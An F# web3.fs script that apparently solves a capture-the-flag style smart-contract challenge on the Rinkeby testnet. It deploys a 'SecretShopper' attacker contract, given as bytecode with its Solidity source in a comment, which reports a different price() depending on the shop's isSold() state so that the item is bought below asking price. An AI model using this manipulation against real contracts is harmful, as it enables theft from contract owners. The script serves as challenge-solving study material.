#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env = createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// my instance: 0x9DbC91c3813399A72F20c7309114e693744aA32B

// Buy item for less than asking price. This is done in a really weird way, but w/e.

let shopABI = """[{"inputs":[],"name":"buy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"isSold","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]""" |> ABI
let shop = loadDeployedContract env "0x9DbC91c3813399A72F20c7309114e693744aA32B" RINKEBY shopABI |> bindDeployedContract |> List.head

let secretShopperABI = """[{"inputs":[],"name":"buy","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"price","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]""" |> ABI
let secretShopperBytecode = """60806040526001600081905580546001600160a01b031916739dbc91c3813399a72f20c7309114e693744aa32b17905534801561003b57600080fd5b506101858061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c8063a035b1fe1461003b578063a6f2ae3a14610055575b600080fd5b61004361005f565b60408051918252519081900360200190f35b61005d6100e5565b005b6001546040805163e852e74160e01b815290516000926001600160a01b03169163e852e741916004808301926020929190829003018186803b1580156100a457600080fd5b505afa1580156100b8573d6000803e3d6000fd5b505050506040513d60208110156100ce57600080fd5b5051156100de57506000546100e2565b5060655b90565b600160009054906101000a90046001600160a01b03166001600160a01b031663a6f2ae3a6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b5050505056fea26469706673582212200aa0679ae5773a8ad47d11344386ed46dc47e43f971fd4aa55f7f9a5f54fc98564736f6c634300060c0033""" |> RawContractBytecode

(*
    contract SecretShopper is Buyer {

    uint256 _price = 1;
    Shop shop = Shop(0x9DbC91c3813399A72F20c7309114e693744aA32B);
    
    function price() external view override returns (uint) {
        if (shop.isSold()) {return _price;}
        else {return 101;}
    }

    function buy() public {
        shop.buy();
    }
}
*)
prepareUndeployedContract env secretShopperBytecode None RINKEBY secretShopperABI |> Result.bind (deployEthContract env ZEROV) |> env.log Log

let secretShopper = loadDeployedContract env "0x935acbdc9e5ce5849b4c9cc2d9e0066502efc39e" RINKEBY secretShopperABI |> bindDeployedContract |> List.head

txn secretShopper (ByString "buy") [] ZEROV

call shop (ByString "isSold") [] |> env.log Log
call shop (ByString "price") [] |> env.log Log
